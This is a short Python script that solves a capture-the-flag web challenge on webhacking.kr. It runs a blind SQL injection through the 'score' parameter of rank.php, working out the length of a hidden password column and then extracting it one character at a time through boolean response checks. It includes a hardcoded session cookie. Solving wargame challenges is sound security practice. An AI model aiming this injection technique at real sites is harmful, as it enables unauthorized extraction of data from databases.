import requests
import string

url="https://webhacking.kr/challenge/web-31/rank.php/"
cookies={'PHPSESSID':"714jde30ucvli2du7unaosnos0"}
ascii_code=string.digits+string.ascii_letters

def getContributeLength():
    result=0

    for i in range(1, 100):
        params="?score=56%20and%20length(p4ssw0rd_1123581321)={}".format(i)
        find_url=url+params
        response=requests.get(find_url, cookies=cookies)

        if response.text.find("id : kimyw0714 // 56")>0:
            result=i
            break

    print("(+) Flag Contribute length is {}".format(result))
    print("(+) Exit")

def getFlag():
    result = ""
    for i in range(1, 32):
        for find in ascii_code:
            params = "?score=56%20and%20ord(right(left(p4ssw0rd_1123581321,{}), 1))={}".format(i, ord(find))
            find_url = url + params
            response = requests.get(find_url, cookies=cookies)

            if response.text.find("id : kimyw0714 // 56") > 0:
                print("(+) find {} index character is {}".format(i, find))
                result+=find
                break

        if(len(result)<i):
            print('(+) {} index character not found'.format(i)) #not find
            result+='?'

    print("(+) Find FLAG is {}".format(result))
    print("(+) Exit")

if __name__=="__main__":
    #getContributeLength()
    getFlag()